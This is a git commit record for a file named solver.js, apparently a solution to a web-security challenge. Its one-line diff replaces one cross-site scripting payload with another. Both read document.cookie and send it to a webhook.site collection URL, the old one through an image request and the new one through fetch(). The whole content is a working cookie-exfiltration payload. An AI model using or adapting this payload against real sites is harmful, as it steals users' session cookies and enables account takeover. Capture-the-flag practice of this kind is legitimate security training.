81b9c4c970f76ca8687059d5c3b024489447c4f4
AnYujin <36614221+4nYuj1n@users.noreply.github.com>
2024-07-29 13:55:51 +0700

    Update solver.js

--- solver.js
+++ solver.js
@@ -1,1 +1,1 @@
-var i=new Image;i.src="https://webhook.site/01de0ba3-72bd-4722-954e-eb11759ef93f/?cookie="+document.cookie;
+fetch('https://webhook.site/01de0ba3-72bd-4722-954e-eb11759ef93f?c=' + document.cookie)  
